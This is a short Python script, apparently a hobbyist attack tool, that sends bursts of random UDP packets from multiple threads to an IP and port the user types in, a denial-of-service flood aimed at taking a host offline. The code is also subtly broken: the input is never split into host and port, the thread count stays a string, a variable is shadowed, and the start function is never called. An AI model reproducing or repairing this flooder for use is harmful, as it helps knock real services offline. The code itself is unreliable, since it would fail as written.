import random
import socket
from colorama import Fore
import threading

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def flood(target):
    for _ in range(16):
        try:
            payload = random._urandom(random.randint(1, 1000))
            sock.sendto(payload, (target[0], target[1]))
        except Exception as e:
            print(
                f"{Fore.RED}Error while sending UDP packet\n{Fore.RED}{e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[DONE] {Fore.YELLOW}UDP Packet Sent! Payload size: {len(payload)}. {Fore.RESET}"
            )

# ---------------------------

target = (input('Target (IP:PORT, ex: 1.1.1.1:80): '))
thread = (input('Thread: '))
def start_udp_flooding(target):
    for _ in range(thread):
        thread = threading.Thread(target=flood, args=(target,))
        thread.start()
